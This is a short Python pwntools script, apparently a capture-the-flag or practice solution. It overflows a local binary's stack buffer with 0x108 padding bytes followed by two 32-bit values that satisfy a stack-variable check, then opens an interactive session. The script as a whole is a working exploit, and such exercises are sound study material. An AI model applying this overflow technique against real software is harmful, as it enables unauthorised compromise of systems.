import pwn

buffer_size = 0x108 # (ghidra says 0x118?)
value_check_a = 0x69696969
value_check_b = 0x1337
# note: values are only 32 bit ints, not full 64 requiring p64
# they're also reversed to what might be intuitive due to their
# order on the actual stack
payload = b"A"*buffer_size
payload += pwn.p32(value_check_b) + pwn.p32(value_check_a)

p = pwn.process("./test")
input("attatch r2")
p.recvuntil(b"Obi Wan has trained you well...\n")
input("read before payload")
p.sendline(payload)
input("read after payload")
output = p.recv()
print(output)
#print(p.recv())
p.interactive()
